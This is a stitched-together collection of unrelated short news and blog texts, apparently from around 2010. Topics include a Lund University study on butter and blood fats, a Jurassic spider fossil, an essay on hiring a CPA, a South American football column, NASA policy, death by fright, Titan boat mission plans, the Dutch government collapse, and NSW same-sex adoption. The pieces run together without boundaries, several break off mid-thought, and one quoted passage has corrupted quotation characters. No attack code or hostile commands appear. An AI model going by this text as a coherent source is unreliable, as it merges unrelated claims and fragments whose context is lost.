High blood fat levels normally raise the cholesterol values in the blood , which in turn elevates the risk of atherosclerosis and heart attack .
Now a new study from Lund University in Sweden shows that butter leads to considerably less elevation of blood fats after a meal compared with olive oil and a new type of canola and flaxseed oil .
The difference was stronger in men than in women .
The main explanation for the relatively low increase of blood fat levels with butter is that about 20 percent of the fat in butter consists of short and medium - length fatty acids .
These are used directly as energy and therefore never affect the blood fat level to any great extent .
Health care uses these fatty acids with patients who have difficulty taking up nutrition -- in other words , they are good fatty acids .
" A further explanation , which we are speculating about , is that intestinal cells prefer to store butter fat rather than long - chain fatty acids from vegetable oils .
However , butter leads to a slightly higher content of free fatty acids in the blood , which is a burden on the body , " explains Julia Svensson , a doctoral candidate in Biotechnology and Nutrition at Lund University .
The greater difference in men is due to , among other things , hormones , the size of fat stores , and fundamental differences in metabolism between men and women , which was previously known .
This situation complicates the testing of women , since they need to be tested during the same period in the menstruation cycle each time in order to yield reliable results .
" The findings provide a more nuanced picture of various dietary fats .
Olive oil has been studied very thoroughly , and its benefits are often extolled .
The fact that butter raises blood cholesterol in the long term is well known , whereas its short - term effects are not as well investigated .
Olive oil is good , to be sure , but our findings indicate that different food fats can have different advantages , " emphasizes Julia Svensson .
" Finally , all fats have high energy content , and if you do n't burn what you ingest , your weight will go up , as will your risk of developing diseases in the long run , " she reminds us .
Here 's how the test was done : 19 women and 28 men participated in the study .
Each individual ate three test meals containing canola - flaxseed oil , butter , or olive oil .
The day before the test they had to fast after 9 p.m .
The following morning a fasting blood sample was drawn to check their health status and all blood fats .
The test meal consisted of the test fat mixed into hot cream of wheat , 1.5- % milk , blackberry jam , and a slice of bread with ham .
The meal contained 35 g of test fat and about 810 Kcal .
Blood samples were then drawn 1 , 3 , 5 , and 7 h after the meal , and all blood fats were analyzed .
The participants fasted during the day .
Scientists have unearthed an almost perfectly preserved spider fossil in China dating back to the middle Jurassic era , 165 million years ago .
The fossilized spiders , Eoplectreurys gertschi , are older than the only two other specimens known by around 120 million years .
The level of detail preserved in the fossils is amazing , said paleontologist Paul Selden of the University of Kansas and lead author of the study appearing Feb. 6 in Naturwissenschaften .
" You go in with a microscope , and bingo !
It 's fantastic . "
The fossils were found at a site called Daohugou in Northern China that is filled with fossilized salamanders , small primitive mammals , insects and water crustaceans .
During the Jurassic era , the fossil bed was part of a lake in a volcanic region , Selden said .
Spider fossils from this period are rare , because the arachnids ' soft bodies do n't preserve well .
The pristine fossil pictured in these photos was probably created when the spider was trapped in volcanic ash .
The ultrafine clay particles squashed the spider without breaking up the animals ' delicate cuticle as more coarse sediment would , Selden said .
E. gertschi shows all the features of the modern members of the family , found in North America , suggesting it has evolved very little since the Jurassic period , Selden said .
" The scimitar - shaped structure you notice out of the male is so distinctive , " he said .
" Looking at modern ones , you think , well , it 's just a dead ringer . "
The findings also suggest this family of spiders , the Plectreuridae , was once much more widespread than it is today .
Currently , the family has only been found living in California , Arizona , Mexico and Cuba .
Yet 165 million years ago , they lived on a small continent called the North China Block .
" At some point something caused their range to contract to this part of southern North America , " Selden said .
He speculates that changes in vegetation during an ice age or other climactic event wiped them out in other areas , " but they were still happy in these arid areas of the Southwest . "

I used to work in a CPA firm back in my 20s .
Filing taxes was a part of the annual routine .
Lately , I ’ve been thinking about the many advantages of having a CPA do your taxes .
Below , I ’m going to share my thoughts with you about why it matters , and for whom .
Do You Need a CPA to Prepare Taxes ?
The answer to this question is … maybe .
There are some cases ( like when you have a super - simple return ) that the services of a CPA might be overkill .
However , there are so many benefits to working with a CPA that most people find it to be well worth the cost .
While anyone can file their taxes on their own or use a different tax preparation solution , as the saying goes , just because you can do something does n’t necessarily mean you should .
Here are a few of the reasons why you ’ll want to consider hiring a CPA .
Why Use a CPA to Prepare Your Taxes
Licensing : Practicing CPAs are required to hold a license through their particular state .
In order for the CPA to maintain this license , he or she must generally do two things : ( 1 ) complete a certain number of continuing education hours ( for example , taking a course on the latest tax deductions ) , and ( 2 ) run his or her business according to specific standards
These standards provide assurance to you that you ’re getting a quality service .
If you ever have a question about your CPAs legitimacy , you can contact your state ’s board of public accountancy and request information about your CPA .
Check out this website for a list of each state board ’s contact information .
Consistency and Stability : A CPA is going to be there for you year after year .
Practicing CPAs are in it for the long run .
Doors are Always Open : A CPA performs many types of financial services , not just taxes .
Therefore , their doors are always open for tax questions , tax planning , and for any audit help you may need .
Many other tax preparation services close their doors from May to December .
Who ’s going to help you when you get that audit letter ?
Your CPA will !
Record Retention : A CPA is going to maintain your tax information much like a doctor holds on the patient ’s medical records .
Your CPA will act as your own personal filing cabinet through the years .
You ’ll even get your own copy of the return and supporting documents in a nice little folder for you to file away yourself if you want .
Digital formats are also becoming more prevalent .
Tax Planning :
The best part about having a CPA is the tax planning advice he or she can provide throughout the year .
There are certain year - end tax moves you can make that will save you hundreds in tax dollars .
Software and tax preparation companies are n’t around to help you with those things .
Professionalism :
As previously mentioned , a CPA is licensed with the state .
They ’ve gone through a ton of accounting classes , a tough exam , and must maintain continuing education credits each year .
Only a person who wants to be a professional is willing to go through what it takes to be a CPA .
Of course , CPAs are still just people .
But I ’ll take the CPA designation over any other type of tax filing option .
Your Time :
The last good reason I ’ll give you is your time .
I ’m not going to lie and say that you wo n’t have to spend a little time preparing your tax files to bring to a CPA .
But these professionals will save you the time it takes to enter in all the information and file your return .
Each year , the process also gets quicker as you learn exactly what you need to bring to your CPA .
How Much Does a CPA Charge to Prepare Taxes ?
As with most things , the amount of money a CPA will charge to prepare your taxes varies depending on a number of factors , including the CPA ’s billing method .
Some of the most common billing methods include :
A flat fee for each tax form / schedule filed
A minimum fee , with additional charges for more complex situations
A set annual fee , with additional charges for changes in your tax situation
An hourly rate based on the amount of time it takes to prepare your return
A set fee for each data point that ’s entered
A subjective amount based on the CPA ’s discretion
You can also expect to pay more if you show up with a box full of disorganized paperwork .
The more effort you put into preparing the information the CPA needs , the faster and less expensive your tax prep should be .
According to the National Society of Accountants , the average cost to hire a CPA in the United States ranges from $ 457 for an itemized Form 1040 with Schedule C and a state tax return to $ 176 for a Form 1040 with a state tax return .
A Form 1040 with a Schedule A and a state tax return will run you an average of about $ 273 .
If this makes you gulp , remember that a CPA will often find ways to help you save you money on your taxes .
In many cases , this will offset at least part , if not all , of their preparation fee .
When Not to Use a CPA
Generally speaking , you do n’t need to use a CPA if you ’ve got a simple return .
If you only file a 1040 EZ , or if you file a 1040 , but take the standard deduction , a CPA would n’t be necessary .
There are plenty of free tax filing services that you can use to quickly prepare and e-file your taxes .

The Low - Down on Boxed Tax Solutions
Another viable option for those who do n’t need a CPA or ca n’t stomach the thought of paying for one is a boxed solution , like Turbotax , TaxAct , or H&R Block online .
These tax preparation programs typically cost between $ 10 and $ 120 , so they are very cost - effective as long as you ’re comfortable with a DIY solution .
In fact , many offer their services for free if you have a simple return .
Once you ’ve gathered all of your documents , you can typically prepare a simple return using one of these programs within an hour .
Some software solutions also offer accuracy guarantees and will provide you with support if you are audited after using their program to file your taxes .
Make sure you read the fine print and that you ’re comfortable with the level of protection you ’re receiving .
Ultimately , you ’ll need to assess the complexities of your tax situation and your comfort with preparing your own taxes to determine whether a boxed tax - prep soultion is a good option for you .

Health insurance rates may skyrocket for consumers and businesses if the current legislation pending in the Senate becomes law , writes Robert Lenzner .
In his column in Forbes magazine , the financial journalist and former manager of risk arbitrage at Oppenheimer & Co. , indicates that the Senate health care reform bill will be something of “ a free ride ” for the health insurance industry until 2014 , the earliest date it will be law .
“ It provides no expanded health coverage and only a very watered - down public option , if any — but not now , not until four years from now , ” writes Lenzner .
“ The health networks where companies will compete to attract new enrollees will not actually be up and running until 2014 , compared to 2013 in the House bill . ”
This means that insurance carriers like CIGNA , Humana , Aetna , UnitedHealth Group , WellPoint will have four more annual enrollment periods to sign up the 31 million people who are not covered by any insurance , at this time , writes Lenzner .
“ The delay means four more years in which the giants can raise their premiums before reform takes place , ” writes Lenzner .
“ Already in 2009 , there have been premium hikes of 8 percent to 10 percent from some companies .
A troubling 238 - page study by WellPoint shows that premiums could triple for small businesses . ”
And that 's rates for the employed , never mind the millions of Americans with no access to employer - based insurance because they do n't have jobs .
Harvard economist Ken Rogoff , former Economic Counselor and Director of Research Department for the International Monetary Fund , sees more headwind ahead .
" It 's hard to see the kind of robust recovery that 's really going to generate the 10 , 11 million jobs that we need to get back to where we were before it started , " Rogoff told Tech Ticker .
A glance at the U.S. economy feels very déjà vu now , Rogoff says .
“ Can I tell you what month the stock market is going to go up and what month it ’s going to go down ?
No .
But the broad contours are really eerily similar to the average of past post - war crises . ”
“ It ’s different than a normal recession in that it ’s all more drawn out . ”
There are people who argue that South America 's Copa Libertadores is better than the Uefa Champions League .
It 's a perverse view , often motivated by bitterness - a bit like those who like to claim that The Beatles were over - rated .
The Champions League congregates the best players from all over the world - it's where they want to be , and where they need to shine these days in order to be considered truly great .
But if Europe 's leading club competition is Lennon and McCartney , it does n't necessarily follow that the Libertadores is Herman 's Hermits , as last week made abundantly and gloriously clear .
The reigning champions can be beaten in the Champions League - Barcelona can be spoiled and marked and frustrated , as they were by Rubin Kazan of Russia last October .
But it 's hard to imagine them being ripped apart in the group phase by rank outsiders , as happened to their South American counterparts in the Libertadores last Thursday .
Alianza Lima caused an upset by beating Estudiantes
It is only two months since Estudiantes of Argentina came within two minutes of causing a major upset by beating Barcelona and being crowned world club champions .
Then they got the defence of the Libertadores title they won last year off to a sound start , turning the screws on Juan Aurich of Peru in the second half to win 5 - 1 .
With Juan Sebastian Veron backed by Brana to win the ball , Perez to scurry down the right and Benitez with his elegant left foot on the other flank , there is probably not a better midfield in the continent - especially since the elegant Jose Sosa has been loaned back from Bayern Munich .
Last Thursday in Peru , Alianza Lima kicked off - and it took Sosa just seven seconds to charge down a forward punt and race away to score .
Business as usual .
Alianza had surprisingly won 3 - 1 away to Bolivar of Bolivia in their first match , but surely they would be out of their depth now .
Nothing much was expected of them going into the campaign .
The club had competed in the competition six times since the expansion in 2000 without reaching the knock out stages , and this year they had not qualified as champions of Peru .
Giving away an early goal in such inept fashion would surely be an insurmountable blow to their morale .
Instead they hit back to win 4 - 1. Striker Wilmer Aguirre was impossible to mark .
The Estudiantes defenders could not catch him to throw sand at his backside as he scored a hat - trick .
And this is a player who spent two utterly unremarkable seasons in France with Metz , and spent most of last year on the Alianza bench .
The remaining goal was scored by big centre forward Jose Carlo Fernandez , who put in another impressive display to follow up a superb one the previous week against Bolivar .
Fernandez also spent two seasons in Europe - and came back from Russia and Belgium without a single league goal .
In 2009 for Alianza he only managed three in 33 appearances , the last in July .
And now in two Libertadores matches he already has three to his name .
Suddenly these two players - both of them three months short of 27 - have shot up a level or 10 .
Theirs is an extreme example , but it is wonderfully illustrative of the capacity the Libertadores has to surprise .
Teams can emerge from nowhere , players can find the key to unlock their natural ability .
It all makes the Libertadores a much less predictable competition than the Champions League .
The other great virtue of the South American competition is the space it gives to youngsters on the way up - another aspect that was strongly highlighted last week .
Libertad have become a force in Paraguayan football over recent years , but have a very small support base .
Their strategy is based on producing players and selling them on , and this year 's crop looks very promising .
Last Tuesday 's 4 - 0 win over Blooming of Bolivia as not a great night for their lanky left - footed striker Pablo Velasquez , so impressive in the three previous games as they fought their way through the qualifying round and then won away to Lanus of Argentina .
But gnat - like little Rodolfo Gamarra , 21 , on the right flank was in fine form , greedy but excellent in one - against - one situations .
And 22 - year - old right wing back Victor Hugo Ayala looks an interesting prospect , curling in crosses like ex-national team right back Arce , and scoring with a ferocious free - kick .
With victory assured , Libertad gave a few minutes to a 16 - year - old , Rodrigo Alborno , tall , strong and left footed , who produced a couple moments of breathtaking promise .
Banfield 's Colombian midfielder James Rodriguez ( right ) is one to watch
And talking of strong , well - built players with an excellent left foot , Banfield of Argentina have a magnificent prospect in 18 - year - old Colombian midfielder James Rodriguez .
He scored with a nice , clipped finish last Wednesday away to Deportivo Cuenca of Ecuador , after opening his account the week before against Morelia of Mexico .
Rodriguez looks tailor - made for European football , and may well be joining Udinese of Italy in the next transfer window .
He is unlikely to be gracing the Libertadores for long .
The last three teams in the competition will make their debut this week - three Brazilian heavyweights , Internacional with an impressive squad , and the big two , Flamengo , with Adriano and Vagner Love , and Corinthians with Ronaldo and Roberto Carlos .
With some big names to enjoy , along with the surprise factor and the sneak preview of the up and comers , then perhaps a connection can be made between the Copa Libertadores and Herman 's Hermits .
As I settle down to follow the action , ' something tells me I 'm into something good ! '
Comments on the piece in the space provided .
Questions on South American football to vickerycolumn@hotmail.com , and I 'll pick out a couple for next week .
From last week 's postbag ;
In one of your previous articles you briefly mentioned the high influx of Paraguayan players going to Mexican clubs .
As a Mexican , I grew up watching Jose Saturnino Cardozo shine in Toluca but as for other big name Paraguayan internationals , that was it .
Now nearly every club in Mexico has a Paraguayan star in their team .
Even today my favourite club in Mexico , Pumas UNAM , has two Paraguayan players in Dario Veron and Dante Lopez who were vital in winning the league title recently .
Cristian Riveros is one of many Paraguayan players who have moved to Mexico
Why is it that so many players from Paraguay are coming to play in Mexico , and do you think the recent incident with Salvador Cabañas , who to me has been the closest to emulating what Cardozo did in Mexico , discourage Paraguayan players from coming to Mexico ?
Rafael Diaz
I doubt that the shooting of Cabanas - who I believe has now moved out of the intensive care unit - will have much effect on the trade .
Paraguayan clubs need to sell , Mexican clubs have money to buy and the long move north has been good for lots of Paraguayan careers .
The main reason that so many have moved is that Mexican clubs have discovered what a good investment Paraguayan players can be .
Some go to Europe , but not that many - perhaps they 're frequently not the biggest players around and they can also be a bit shy .
But so often they are excellent team players , battlers with increasingly , a good technical level as youth development work has improved in the country .
There are some Paraguayans in Mexico - Cristian Riveros of Cruz Azul is an obvious example , perhaps Edgar Benitez of Pachuca - who could do a good job in Europe .
Credit goes to the Mexican clubs for snapping them up .
For Argentina at the Fifa World Cup 2010 , who are the options at right back besides Marcos Angeleri ?
Chris Leonard
Angeleri of Estudiantes is only just starting his comeback from long - term injury - and we 'll have to see if this has affected his pace , which was his outstanding asset .
For next week 's friendly against Germany his club - mate Clemente Rodriguez has been called up but I really do n't see him as a viable option .
Is there anyone better than Zanetti out there ?
I still wonder , bearing in mind the lack of full - back options on both flanks , whether Maradona will end up going with a back three .
02 Take The Pledge
Plastic pollution has been found all over our planet , from the peaks of mountains to the depths of the ocean .
Throw - away single - use plastics are the culprit .
Let your inner changemaker shine and pledge to stop using these wasteful products .
President Obama ignored warnings not to appear at the National Prayer Breakfast today , since it was organized by fundamentalist religionists whose animus towards not just him but all progressives has been all too obvious for years .
But he did anyway -- and , as Sam Stein at HuffPo reports , actually managed to deliver an important message about the critical role of civility in a democratic society .
The main point was that right - wing nutcases , and their frothing about Obama 's supposed foreignness and radicalism and hatred of Christianity , make it impossible to even have a rational discussion :
Obama : Civility also requires relearning how to disagree without being disagreeable -- understanding , as President [ Kennedy ] said , ' Civility is not a sign of weakness . '
Now I am the first to confess I am not always right .
Michelle will testify to that .
But surely , you can question my policies without questioning my faith .
Or for that matter , my citizenship .
No doubt , the talkers at Fox will take this as evidence that he hates the " jes ' folks " who populate the Tea Parties .
Current NASA
Administrator and former astronaut Charles Bolden , speaking a few weeks ago at a meeting of the American Astronomical Society , explained how our nation 's space program is at a crossroads and pledged to continue manned missions into space .

A combination of the federal budget deficit and a number of successful unmanned space endeavors — think Hubble , Mars Rovers — has dimmed Dubya 's plan to put man back in space in a big way .
Bolden , however , refuses to let the Astronaut die on his watch .
" I do not see this president being the president who presides over the end of human spaceflight , " he said .
Bolden expressed an interest in partnering with other nations on practical manned missions , in addition to continuing to develop more efficient space flight technologies .
Still , there are many powerful voices who consider manned spaceflight a frivolous endeavor .

NASA 's course will be determined in large part by Barack Obama and the funding he allots to the agency in the next few weeks .
Here 's to hoping he 's looking towards the stars .

What could be the world ’s most expensive wallpaper made of ?
Of money , obviously !
I just came across an interesting post about the Money Pubs in the US where money is being put on the walls , dollar bill by dollar bill .
The two money pubs mentioned are the No Name Pub that started in 1931 in Big Pine Key , FL as a general store and the McGuire ’s Irish Pub that opened in 1977 .
In the 70’s and 80’s , the No Name Pub became widely famous because of Jimmy Buffet popularity .
People started coming and so their money and that money started being put on the walls , dollar bill by dollar bill .
The thirty year results can be seen in the pictures .
Startlingly , there is over $ 750,000 in singles hanging on the walls and from the ceiling .
On the other hand , McGuire ’s Irish Pub has an interesting story with money wallpapers .
Molly , the Pub ’s first waitress , took her first dollar tip and stapled it on the wall .
Since that day , there has been over $ 550,000 in dollar bills stuck on the walls and ceiling .
The best thing is that these dollar bills have been artistically stuck on the walls and ceiling .

Science is n’t sure whether fear can kill but several courts have been convinced and have convicted people for murder on the basis that they caused death through fright .
An article just published in the American Journal of Cardiology summarises the eight murder trials .
The cases are not , as I first suspected , where someone had deliberately tried to kill someone else using fright as a ‘ weapon ’ ( like in the infamous scene in Belgian serial killer mockumentary Man Bites Dog – clip here – warning : not pleasant ) .
Instead , they typically describe where someone has died of a heart attack in the midst of an armed robbery or assault , despite not being mortally wounded .
In a similar case , State v. Edwards ,10 the defendant and his accomplices entered a bar in Tucson , Arizona and committed a robbery at gunpoint .
Shortly after the robbers had fled , the proprietor experienced a heart attack and died .
The defendant argued that the victim ’s death was accidental and unintended and could not constitute murder .
Moreover , the defendant maintained that the evidence was insufficient to prove that the robbery actually caused the victim ’s death .
The court disagreed on both counts , finding first that accidental , unintended consequences could form the basis of a murder conviction .
Second , the court pointed to the testimony of a pathologist that the death was caused by anxiety resulting from the robbery at gunpoint .
The court held that this provided adequate evidence to support causation .
However , this is not the only area where supposedly being ‘ frightened to death ’ has caught the interest of psychologists .
There is a small psychological literature on ‘ psychogenic death ’ that attempts to explore reports of death after curses , spells or violation of cultural taboos .
This is from an excellent brief article from 2003 , published in the journal Mental Health , Religion & Culture :
Landy ( 1977 , p. 327 ) describes the phenomenon as follows : ‚ Äòa process is set in motion , usually by a supposed religious or social transgression that results in the transgressor being marked out for death by a sorcerer acting on behalf of society through a ritual of accusation and condemnation ; then death occurs within a brief span , usually 24 to 48 hours ‚
Äô. Ellenberger ( 1965 ) distinguishes acute from slow psychogenic death .
In some cases , the death can be rapid , in other cases the process occurs over several weeks where the patient sickens and dies .
There has been some doubt expressed as to whether voodoo death is part of ‚ Äòcolonial folklore ‚
Äô only based on anecdotal reports ( Williams , 1928 ) .
Lewis ( 1977 , p. 11 ) asks , ‚ Äò
Is it really the case that healthy people have died in a day or three days because they know they were victims of sorcery ?
Who has seen this happen with his own eyes ?
Is there no explanation for it but sorcery ?
‚Äô Yap ( 1977 ) calls for concrete findings from anthropologists and medical field workers that can be appraised critically .
Questions have arisen as to whether or not these victims had pre-existent pathological conditions predisposing them to death .
There is however some direct evidence for its occurrence .
The evidence is not people just dropping dead , but from several documented cases where perfectly healthy people rapidly give up eating and drinking after being ‘ cursed ’ and dehydration leads to death .

Philippa talks about others ’ expectations that she would be ashamed of hair on her legs .
I had some surgery on my leg last week , and when everything was being prepared around me , the surgeon shaved the patch of my leg that he was going to be working on .
My main concern at the time was that he had n’t wet the razor , so he was taking off several layers of skin as well as the hairs he was aiming at .
It was only when the other people in the room started telling me to not be embarrassed that I had n’t shaved my legs , that it did n’t matter , that I ’d had enough to worry about in advance without worrying about having clean - shaven legs too , that it even crossed my mind that people were expecting me to be ashamed of the hairs .
I do n’t shave my legs .
I could probably count on the fingers of one hand the number of times I must have done it in the last 5 years or so .
I forget that I do n’t do it , like I do n’t think about other things I do n’t do .
So I did n’t feel ashamed , yet people ’s expectations were that of course I would feel ashamed , and that they would need to reassure me .
Those people were all very lovely , and very supportive throughout the experience , and were reassuring me about so many things , that I did n’t think too much about it .
They were , frankly , saying anything that they could say to calm me down , and I ’m sure that there were n’t judgements within what they said .
But their expectations were that I would be embarrassed , and I ’m not .
They got those expectations by living in this society that we live in , which does make women feel embarrassed by the things our bodies naturally do .
It is a strange situation we ’re in , where women do n’t have to explain why they do shave , but not shaving does so often seem to require explanation .
I do n’t think women should feel obliged to justify either , frankly .
The people in that room did n’t care , but they were concerned that I thought they would think badly of me .
And if the Daily Fail is to be believed , women with furry legs in public is both newsworthy and horrifying .
Clearly , I dispute that !
Not only will I not shave , I will also not apologise for it .
PORT -AU - PRINCE , Haiti—
In a closed courtroom in one of the few government buildings still standing here , Laura Silsby and nine other American missionaries were charged Thursday with abducting children from this earthquake - ravaged capital .
When the proceeding was done , the 40 - year - old from a mountain valley in Idaho walked out of Le Tribunal de Paix , past a scrum of microphones , cameras and seething Haitians and into a government minivan with a co-defendant .
As they waited to return to a fetid cell with mattresses on a concrete floor , they appeared to pray .
Their lawyer , Edwin F. Coq Jr. , said they had been charged with child abduction and criminal association and not the more - serious charges of kidnapping and child trafficking in connection with trying to take 33 children into the neighboring Dominican Republic .
The charges could carry sentences of up to nine years and up to three years , respectively , Mr. Coq said .
" No trafficking ?
What is wrong with this country ? " one man in the crowd yelled in English afterward .

Becalmed a nd adrift on the current , a high sided craft is slowed by air resistance , whereas floating debris has little or no windage and a gradual separation of the two usually indicates the set ( direction ) of the current .
The Two Seconds Log
As a rough guide to the drift ( speed ) of the current , an item drifting past an anchored object at one knot will cover about one metre in 2 seconds .
So , two metres in two seconds would represent two knots and so on .
Wind and waves
On a windy day in an estuary or a river , when the tide is ebbing or flowing , the current will be seen working with or against the wind through the behaviour of the waves .
If the wind is against the current , the wave faces become short and steep and the sea is choppy .
When the wind is with the current , the waves are much smoother and longer .
In light winds and a calm sea , a related effect may be observed .
With the wind and current working together , long smooth patches on the surface will often indicate where the current is flowing faster and offer ing less resistance to the wind .

Last April , Ivor van Heerden , an internationally known hurricane expert , was told he was losing his job at Louisiana State University .
He and other experts said it was because of his outspoken criticism of the federal government ’s flood protection of New Orleans ; the university would not comment .
Now Dr. van Heerden , the former deputy director of the L.S.U.
Hurricane Center , is suing the university to get his job back .
His lawyers filed a lawsuit in Louisiana state court on Wednesday morning , charging harassment and wrongful termination .
Dr. van Heerden , who was born in South Africa , joined L.S.U. in 1992 and rose to prominence as an expert on storms and the region , becoming a research professor and director of the Center for the Study of Public Health Impacts of Hurricanes .
In the years before Hurricane Katrina , in 2005 , he sounded alarms about the potentially devastating impact of a major storm on New Orleans despite 40 years of hurricane protection efforts .

The first interplanetary nautical craft may be a boat to explore the methane seas of Titan .
A proposed mission to Titan would explore some of its largest seas , including Ligeia Mare ( pictured ) or the Kraken Mare , both of which are in the northern hemisphere of the foggy moon of Saturn .
The concept has been studied for over two years by scientific team led by Ellen Stofan of Proxemy Research , Inc. in Washington DC , and has recently been submitted to NASA .
The concept is under consideration by NASA to be one of the Discovery Class missions – low - cost , high - return missions , which include the MESSENGER and Kepler missions .
If chosen , the Titan Mare Explorer ( TiME ) , could launch as early as January of 2015 , and would make port at Titan in June of 2023 .
The total proposed cost of TiME is currently estimated at $ 425 million .
Stofan described the proposal at this year ’s American Geophysical Union meeting in San Fransisco , CA .
Lakes , seas , and rivers were discovered on Titan by the Cassini spacecraft in 2005 .
Since then , the weather and climate patterns of the moon have been scrutinized by scientists , leading to the discovery of both fog and rain .
Of course , the proposed boat would n’t be the first craft to land on Titan – that distinction is held by the Huygens probe , which as part of the Cassini mission landed on Titan on January 14th , 2005 and for three hours took images and scientific data which it sent back to Earth .
Huygens touched down on dry land , though it was designed to operate on either land or ocean .
Proposed instruments for the boat include a mass spectrometer , sonar , cameras and meteorology instruments .
TiME would investigate the chemical composition of the seas of Titan , as well as monitor the cycle of ethane and methane on the moon ( called the “ methane - ologic ” cycle ) , a process that scientists are just beginning to understand .
The sonar would be used just like it is on submarines and boats here on Earth – to map the depth of the seas , as well as get an accurate image of the sea bottom .
Since the cloudy and foggy surface of Titan sees little sunlight , the boat is proposed to be powered by an Advanced Stirling Radioisotope Generator .
These types of engines , called Stirling engines after the inventor , Robert Stirling , use a radioactive source such as plutonium to heat a gas in one chamber , and as it flows to a cooler chamber the flow is turned into mechanical energy with a very high rate of efficiency .
If the boat is seaworthy , it may set a precedent to give us Earthlubbers a chance at understanding the only other body in our Solar System with lakes and seas on its surface ( though Europa and Enceladus are thought to have watery oceans under their crusts ) .
By comparing the methane - ologic cycle on Titan with the Earth ’s hydrologic cycle , scientists could gain a more intricate knowledge of the large - scale impact of these cycles .

Opposites attract , but not in marriages or other long - term relationships .
As I describe in BLONDES , we value in others what we value in ourselves .
So many of us prefer those with similar background , religion , ethnicity , education , values , and so on .
Women often prefer potential spouses who look like themselves or family members .
We even prefer those whose body language and verbal intonation resembles our own .
The marriage - minded seek the like - minded .
So is it any wonder that researchers have now found evidence that birth order — one of the major forces that influences who we are — also influences our choice in marriage ?
In a recent study , Harvard researcher Joshua Hartshone and his colleagues found evidence that people are more likely to form long - term romantic relationships with someone of the same birth order rank .
Only children are likelier to marry other onlies , firstborns are likelier to marry firstborns , middleborns are likelier to marry middleborns , and lastborns are likelier to marry lastborns .
The study , based on the responses of over 2,500 visitors to the website www.coglanglab.org, found that the birth - order effects are independent of family size and unlikely to be a product of class or ethnicity .
“ If spouses correlate on personality , ” Hartshone writes , “ and personality correlates with birth order , spouses should correlate on birth order . ”
Incidentally , the researchers found that best friends also tend to share the same birth order .
My parents are both firstborns .
Many of my closest friends are onlies and firstborns who married other onlies and firstborns respectively .
Me , I ’m a firstborn who married a middleborn .
The Dutch Prime Minister , Jan Peter Balkenende , says his coalition government has collapsed after members failed to agree on a NATO request to extend the Netherlands ' military mission in Afghanistan .
" Later today , I will offer to her majesty the Queen the resignations of the ministers and deputy ministers of the PvdA [ Labour Party ] , " he told journalists in the early hours of Saturday ( local time ) .
Mr Balkenende made the announcement after the cabinet held more than 16 hours of talks in The Hague to try to settle the dispute .
The PvdA is one of three parties in the coalition government , with Balkenende 's Christian Democratic Appeal the senior partner .
Vice - premier Wouter
Bos invoked the ire of his cabinet colleagues by stating this week that his PvdA would not support extending the Dutch deployment in Afghanistan beyond 2010 .
NATO head Anders Fogh Rasmussen had asked the Netherlands earlier this month to take on a new training role and remain in Afghanistan until August 2011 , a year later than originally planned .
Mr Balkenende responded by saying the matter was still under discussion , while the Christian Union , the junior partner in the coalition , chided Mr Bos for speaking out of turn .
The public spat resulted in a snap parliamentary debate Thursday , during which Mr Bos was accused of using the issue for political gain as polls show his party lagging in the run-up to March 3 municipal elections .
The deployment of Dutch troops in Afghanistan was an unpopular move with voters from the outset .
" As the leader of the cabinet , I came to the conclusion that there is no common road for the CDA , PvdA and the Christian Union to take into the future , " Mr Balkenende said .
" For days we have seen that unity has been affected by ... statements that clash with recent cabinet decisions . "
This was Mr Balkenende 's fourth government in a row in eight years .
All have collapsed before their mandate expired .
Around 1,950 Dutch troops are deployed in Afghanistan under the NATO - led International Security Assistance Force .
The Dutch mission , which started in 2006 , has already once been extended by two years and has cost 21 soldiers ' lives .

" The loss of our investment in Stuyvesant Town is very unpleasant and clearly not something we would ever have wished for .
But painful as it has been , we have been able to absorb it and it has not knocked us off strategic course in any way , " he said .
Legal experts and human rights groups have slammed the New South Wales Government over its decision not to allow same - sex couples to adopt children .
While gay couples can adopt in some Australian states , the NSW Government says the issue is too complex and sensitive and it will not be changing the law , at least for now .
But the decision has renewed calls for a national approach to adoption .
A six - month parliamentary inquiry found allowing same - sex couples to adopt would be in the best interests of children .
Despite many children being cared for by same sex couples , the state Minister for Community Services , Linda Burney , says there is not enough community support to change the law .
" What I am saying to those couples is this discussion needs to continue .
At this stage we 're not pursuing legislation , " Ms Burney said .
" But I do want further discussion .
I do want further community education and understanding around this issue , because at the end of the day it is about a child growing up in a loving , caring relationship and that 's what 's important . "
There is a quirk in the law , however , as single gay men and women are allowed to adopt , and gay couples are allowed to foster children .
Kellie McDonald , the co-convenor of the NSW Gay and Lesbian Rights Lobby , says adoption is the last piece of legislation in the state that still discriminates against same - sex couples and their families .
" The primary concern should be what are the best interests of the children , and the Government has recognised that , " she said .
" It should n't be pandering to other groups ' opinions if they believe that these reforms would be in the best interest of the child . "
Calls for national approach
A leading human rights and anti-discrimination lawyer , Wayne Morgan , says there are human rights attached to family life .
" This is set out in a number of international covenants , in the human rights legislation that we have in some states and territories in Australia , " he said .
" Children suffer when they do not have two legally recognised parents , so I would say this adoption rights issue is a human rights issue .
" Not in and of itself , but in terms of the human right to a family and in terms of the best interests of the child . "
Mr Morgan dismisses the suggestion the NSW community is not ready for same - sex adoption .
" Surveys reflect that the average Australian thinks gay men and lesbians should be allowed to marry , to adopt , indeed , be allowed to make use of artificial reproductive technologies to have their own children , " he said .
" So given that level of acceptance in the community , this scaring of horses , I would ask , well , what horses are we scaring ?
" I would challenge the NSW Government , or any government , to put forward a valid , rational reason as to why the reforms should not go ahead . "
There are now growing calls for the Federal Government to take over adoption laws .
A spokesman for the Australian Coalition for Equality , Corey Irlam , says there is inconsistency across the country because there is adoption protection in Tasmania , the ACT and Western Australia .
" Victoria and NSW have this as a live issue by referring it for a national approach , " Mr Irlam said .
" But from a child 's perspective , it should n't matter which state they live in , they should be entitled to a loving and legal recognition of two parents . "
The new record - holder for the most precise timekeeper could tick off the 13.7 - billion - year age of the universe to within 4 seconds .
The optical clock monitors the oscillation of a trapped atom of aluminium - 27 .
It is more than twice as precise as an earlier version , reported in 2008 , and was built at the National Institute of Standards and Technology in Boulder , Colorado .
“ It ’s extremely impressive , ” says Patrick Gill of the UK ’s National Physical Laboratory , who was not involved with the work .
The second is currently defined by caesium atomic clocks , but optical clocks promise higher precision because their atoms oscillate at the frequencies of light rather than in the microwave band , so they can slice time into smaller intervals .
Such clocks could help spot tiny changes in physical constants over time .

SERIOUS doubts have emerged about the case of Peter Spencer , with the NSW farmer 's family saying his 47 - day hunger strike concerns more than land - clearing .
Graham Spencer , Peter Spencer 's brother , criticised the politicians , reporters and activists who have turned his brother into a cause , saying they did not know the full story .
According to The Australian , Mr Spencer 's remarks are a swipe at , among others , Nationals senator Barnaby Joyce , who publicly took up Mr Spencer 's cause .
